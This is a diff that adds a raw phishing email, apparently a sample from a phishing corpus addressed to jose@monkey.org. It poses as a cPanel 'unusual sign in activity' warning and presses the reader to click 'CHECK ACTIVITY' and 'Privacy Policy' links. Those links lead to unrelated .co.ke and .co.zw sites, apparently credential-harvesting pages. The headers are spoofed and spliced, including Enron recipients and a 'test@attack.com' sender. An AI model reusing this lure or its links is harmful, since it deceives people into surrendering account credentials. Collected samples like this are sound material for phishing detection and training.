@@ -1,0 +1,99 @@
+From:(mmalloy@naruc.org), <test@attack.com>
+To: sean.bolks@enron.com, kimberly.watson@enron.com, paul.y'barbo@enron.com
+Subject: jose@monkey.org.....
+Date: Sun, 09 May 2021 07:00:57 -0800
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - med.mediagunn.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - wanadoo.fr
+X-Get-Message-Sender-Via: med.mediagunn.com: authenticated_id: smtpfox-zlfo8@prepsite.xyz
+X-Authenticated-Sender: med.mediagunn.com: smtpfox-zlfo8@prepsite.xyz
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Status: No, score=2.51
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf25.b.hostedemail.com: domain of indoceanic@wanadoo.fr has no SPF policy when checking 192.163.208.148) smtp.mailfrom=indoceanic@wanadoo.fr
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: F0933118157
+X-Stat-Signature: su4z3n78bryyo39yk4gtfiw6oaak7np3
+Received-SPF: none (wanadoo.fr>: No applicable sender policy available) receiver=imf25.b.tucows.com; identity=mailfrom; envelope-from="<indoceanic@wanadoo.fr>"; helo=med.mediagunn.com; client-ip=192.163.208.148
+X-HE-DKIM-Result: none/none
+X-HE-Tag: 1620585933-462144
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 32
+
+You will not see this in a MIME-aware mail reader.
+--===============0388653603==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+         Unusual Sign in activity for       =
+
+
+jose@monkey.org
+
+Notification that your email account was signed in from a new location devi=
+ce or app =
+
+ If you didn't access your Account from a different location please check t=
+he activity and =
+
+           protect your account from being used from another device.      =
+
+
+CLICK HERE TO CHECK ACTIVITY  =
+
+
+Note: locations and device types reflect our best guesses based on your ISP=
+ or wireless carrier =
+
+Best Regards   Copyright=FFFD 2019 cPanel, Inc.
+Privacy Policy
+
+
+
+
+
+--===============0388653603==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><HEAD><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Dutf-8"/>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY><DIV>
+<CENTER>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT size=3D1><STRONG><=
+FONT size=3D2>Unusual Sign in activity for</FONT></STRONG>&nbsp;</FONT>&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR><FONT color=3D#556faa><BR><STRONG>jose@=
+monkey.org<BR><BR></STRONG><SPAN><FONT face=3DCalibri><FONT color=3D#222222=
+>Notification that your email account was signed in from a new location dev=
+ice or app&nbsp;<BR></FONT><FONT color=3D#222222>&nbsp;If you didn't access=
+ your Account from a different location please check the activity and&nbsp;=
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; protect yo=
+ur account from being used from another device.</FONT></FONT></SPAN></FONT>=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR><BR><A class=3Dm_309169248840342703=
+6daria-goto-anchor style=3D"COLOR: rgb(17,85,204)" href=3D"https://intercro=
+sstechservices.co.ke/wp-protect" target=3D_blank data-saferedirecturl=3D"ht=
+tps://www.google.com/url?q=3Dhttps://winbricks.co.zw/astorm&amp;source=3Dgm=
+ail&amp;ust=3D1569516882389000&amp;usg=3DAFQjCNGQG6846sm1fnzwYcj6HXW68cg8YQ=
+" data-saferedirectreason=3D"2"><STRONG>CLICK HERE TO CHECK ACTIVITY</STRON=
+G></A>&nbsp;&nbsp;<BR><BR><SPAN style=3D"FONT-STYLE: italic"><FONT size=3D2=
+ face=3DCalibri>Note: locations and device types reflect our best guesses b=
+ased on your ISP or wireless carrier</FONT></SPAN> <BR>Best Regards</CENTER>
+<CENTER>&nbsp; Copyright=EF=BF=BD&nbsp;2019 cPanel, Inc.<BR><A style=3D"COL=
+OR: rgb(17,85,204)" href=3D"https://winbricks.co.zw/astorm" target=3D_blank=
+ data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://winbricks.c=
+o.zw/astorm&amp;source=3Dgmail&amp;ust=3D1569516882389000&amp;usg=3DAFQjCNG=
+QG6846sm1fnzwYcj6HXW68cg8YQ" data-saferedirectreason=3D"2">Privacy Policy</=
+A><BR><BR><BR><BR><BR></CENTER></DIV></BODY></HTML>
+--===============0388653603==--
